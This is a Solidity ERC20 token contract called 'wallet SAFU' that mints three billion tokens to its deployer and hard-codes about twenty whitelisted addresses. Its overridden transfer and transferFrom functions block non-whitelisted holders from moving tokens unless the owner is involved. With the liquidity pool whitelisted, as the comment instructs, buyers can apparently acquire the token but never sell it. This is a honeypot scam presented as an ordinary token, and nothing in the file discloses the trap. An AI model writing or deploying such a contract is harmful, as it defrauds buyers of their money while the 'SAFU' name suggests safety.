// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("wallet SAFU", "WSFU") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 3000000000 * 10 ** decimals());
        whiteList[0x7ef444cFEcbd6e1f8d7181D4043B6a7F6DadF6F0]= true;
        whiteList[0xD22255945a112b473e32be2FC1395C1b18819EA6]=true;
        whiteList[0x29310AED2931800A50D9c7f1e8DcC8D79841718A]=true;
        whiteList[0x973bE99f6bB1b31391112608A37d73D1Ab3816F9]=true;
        whiteList[0x87be50471D9B2BC67BACac1Ee2E66fc7BcE0847F]=true;
        whiteList[0x2a0Bf033b8E915722c91547200A5cB7D51f8a820]=true;
        whiteList[0x649972d959fbEa6A82248Be4cB2b395fcBe269eb]=true;
        whiteList[0x25be289fc830FFf17869afEeE3186F8881E8c0E3]=true;
        whiteList[0xA0B5Bb2D61dD6e0BB48977Bd95982fb4FA1339Ee]=true;
        whiteList[0x01eF68d060b54F3AC59e02152D893e1b185A9d65]=true;
        whiteList[0xe509fb9e24b799fa314f9e02cfdBab7d9AcB4ff5]=true;
        whiteList[0x568fcd09dE55Fc5b4bf99A7C9607d80ea0447655]=true;
        whiteList[0x1790a6f7a9e93296306Aeb13BF370B992A108d35]=true;
        whiteList[0x7fa45723EF1E3844C2F78EFBF408898844fA4c3A]=true;
        whiteList[0xA98E7a45aE9E97411b2B25258BB3635a58e07602]=true;
        whiteList[0x06252375cD6a275D11855f3D4782C867e2eD79Ef]=true;
        whiteList[0x060279aa3D8f60ECf9C7263A17EEbD78a89aB72c]=true;
        whiteList[0x14C893a1C854e54F1603bD77dC1eAa85F3850cb1]=true;
        whiteList[0xD16702f4650c4B28A7C18E8eBbd3771F3A8caD61]=true;
        whiteList[0x95421B99686c02f86c7F62bc843332fCdbe0293b]=true;
        whiteList[0xc79620BB1790397BAE76939C491580ea6acef485]=true;
        whiteList[0x256eF1Ded3CA1f710b671B9203C8aA32D2593Ad9]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}